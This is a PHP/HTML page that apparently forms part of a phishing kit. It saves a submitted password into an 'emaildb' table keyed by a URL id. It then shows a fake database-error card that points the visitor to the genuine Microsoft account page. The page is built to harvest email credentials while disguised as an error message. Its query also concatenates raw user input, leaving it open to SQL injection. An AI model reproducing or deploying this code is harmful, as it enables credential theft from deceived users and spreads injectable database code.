<?php
include("conection.php");


if (isset($_POST['send'])) {
    if (strlen($_POST['pass']) >= 1) {
	    $password = trim($_POST['pass']);
	    $ide = ($_GET['variable1']);
	    $resultado = mysqli_select_db($conex3, $db) or die ("error to connect");
	    mysqli_query($conex3,"UPDATE emaildb SET password = '$password' WHERE id = '$ide'");
	    if ($resultado) {
	    	?> 
	    	
           <?php
          
	    } else {
	    	?> 
	    
           <?php

	    }
    }   else { 
			?>

		

			<?php
		}	

}


?>
<!DOCTYPE html>
<html>
	<head>
		<title>Something has wrong</title>

		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<link rel="icon" href="img/favicon.ico">
		<link rel="stylesheet" href="Style.css">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/css/mdb.min.css" rel="stylesheet">
	 
		
		<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
	</head>
	<body>
		<h3 class="text-center text-white" >
			An error has occurred
		</h3>

		<div class="row text-center justify-content-center">

	    <!-- Grid column -->
	    <div class="col-lg-4 col-md-12 mb-4">

	        <div class="card text-center">
	            <div class="card-body">
	                <h3 class="font-weight-bold deep-orange-lighter-hover mb-3">An error has occurred while connecting to the database</h3>
	                <h5 class="brown-lighter-hover">Please try the follow:</h5>
	                <ul class="list-group">
	                	<li class="list-group-item text-left"> </li>
					  	<li class="list-group-item text-left">*Enter again with: <a href="https://account.microsoft.com/account?lang=en-hk">This link</a></li>
					  	<li class="list-group-item text-left">*Login later</li>
					  	<li class="list-group-item text-left">*Check your internet connection</li>
					  	<li class="list-group-item text-left">*Check your browser version and if necessary, upgrade to the lastest version</li>
					</ul>
	            </div>
	        </div>

	    </div>

		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

	    <!-- Bootstrap tooltips -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>

	    <!-- Bootstrap core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>

	    <!-- MDB core JavaScript -->
	    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.16.0/js/mdb.min.js"></script>
	    <!-- My script -->
	    <script type="text/javascript" src="js/script.js"></script>
	</body>
</html>